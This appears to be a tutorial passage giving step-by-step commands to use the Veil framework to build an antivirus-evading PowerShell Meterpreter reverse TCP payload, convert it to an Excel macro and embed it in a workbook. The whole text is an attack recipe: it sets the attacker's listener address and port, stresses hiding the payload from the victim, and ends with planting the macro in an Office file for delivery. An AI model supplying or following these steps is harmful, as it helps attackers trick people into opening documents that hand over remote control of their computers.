sudo apt update
apt install veil
veil

After updating, you will see two available tools. The first tool is the Evasion tool and the second tool is the Ordnance tool. We are going to use the Evasion tool.
This tool provides functionalities like evading or hiding Our Payload from Being Captured by the Victim.
use 1
list
payload id-24
use powershell/meterpreter/rev_tcp
set lhost  192.168.0.122
set lport 4444
generate
Enter the name of the file. Let the name of the file to be generated be “demo“. Therefore;

demo
Now, the Veil tool has created a bat file in PowerShell code in the directory:

/var/lib/veil/output/source/demo.bat
Now, open a new terminal and open veil again( using command ‘veil’) and then type:

use auxiliary/macro_converter
macro_converter converts the bat file into a readable text file. Under this, type the following commands to generate a text file:

set POSH_BATCH /var/lib/veil/output/source/demo.bat
generate
This generates a text file in /var/lib/veil/output directory.
Now open windows->New Microsoft  Office Excel Worksheet->view(on the top bar)->macro

Enter the macro name->create
Then in the Macro editing area(or the workbook) copy paste the code present in “demo1.txt” to the workbook and save the macro.
